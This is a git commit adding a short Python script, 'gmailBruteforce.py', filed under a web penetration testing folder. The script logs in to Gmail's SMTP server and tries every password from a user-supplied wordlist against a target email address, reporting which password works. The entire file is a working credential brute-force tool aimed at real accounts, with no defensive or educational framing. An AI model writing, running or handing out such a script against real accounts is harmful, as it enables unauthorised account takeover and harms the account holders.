2b41bf1730c59ce8fc3d643bad9617f19e102606
Warmonger <86009160+Malwareman007@users.noreply.github.com>
2022-07-27 01:50:01 +0530

    commit
    Signed-off-by: Warmonger <86009160+Malwareman007@users.noreply.github.com>

---
+++ WEB_Penetration_Testing/gmailBruteforce.py
@@ -0,0 +1,22 @@
+#/usr/bin/python
+
+
+import smtplib
+from termcolor import colored
+
+smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
+smtpServer.ehlo()
+smtpServer.starttls()
+
+user = input("Enter Target Email Address: ")
+file = input("Enter Path to Password File: ")
+passwordFile = open(file, "r")
+
+for password in passwordFile:
+    password = password.strip('\n')
+    try:
+        smtpServer.login(user, password)
+        print(colored('[+] Password Found: %s' % password, "green")) 
+    except smtplib.SMTPAuthenticationError:
+        print(colored('[-] Wrond Password: %s' % password, "red"))
+
